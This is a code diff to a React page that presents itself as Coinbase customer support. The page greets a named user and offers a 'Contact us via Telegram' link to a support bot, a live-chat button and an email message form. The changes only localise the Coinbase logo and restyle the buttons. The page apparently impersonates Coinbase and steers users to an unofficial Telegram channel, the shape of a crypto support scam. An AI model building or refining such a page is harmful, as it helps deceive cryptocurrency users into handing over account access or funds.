@@ -69,7 +69,7 @@ function App() {
         <div style={centerScreen}>
           <div style={box}>
             <img
-              src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Coinbase_Logo.svg/256px-Coinbase_Logo.svg.png"
+              src="/coinbase-logo.png"
               alt="Coinbase"
               style={logoStyle}
             />
@@ -83,15 +83,17 @@ function App() {
         <div style={centerScreen}>
           <div style={box}>
             <img
-              src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Coinbase_Logo.svg/256px-Coinbase_Logo.svg.png"
+              src="/coinbase-logo.png"
               alt="Coinbase"
               style={logoStyle}
             />
             <h2 style={{ marginBottom: 20 }}>Welcome, {name}</h2>
-            <a href="https://t.me/coinbasesupportbot" target="_blank" rel="noreferrer" style={linkButton}>
-              💬 Contact us via Telegram
-            </a>
-            <a href="#" style={chatButton}>💬 Live Chat</a>
+            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "12px" }}>
+              <a href="https://t.me/coinbasesupportbot" target="_blank" rel="noreferrer" style={linkButton}>
+                💬 Contact us via Telegram
+              </a>
+              <a href="#" style={chatButton}>💬 Live Chat</a>
+            </div>
             <p style={{ marginTop: 30 }}>Or send us a message via email:</p>
             <input style={inputStyle} placeholder="Your email" value={email} onChange={(e) => setEmail(e.target.value)} />
             <textarea rows="4" style={{ ...inputStyle, height: "100px" }} placeholder="Message" value={message} onChange={(e) => setMessage(e.target.value)} />
@@ -187,15 +189,16 @@ const chatButton = {
   backgroundColor: "#22c55e",
   textDecoration: "none",
   display: "inline-block",
-  marginTop: "10px"
+  width: "100%",
+  textAlign: "center"
 };
 
 const linkButton = {
   ...buttonStyle,
-  display: "block",
-  width: "100%",
+  display: "inline-block",
   textDecoration: "none",
-  marginBottom: "10px"
+  width: "100%",
+  textAlign: "center"
 };
 
 ReactDOM.createRoot(document.getElementById("root")).render(<App />);
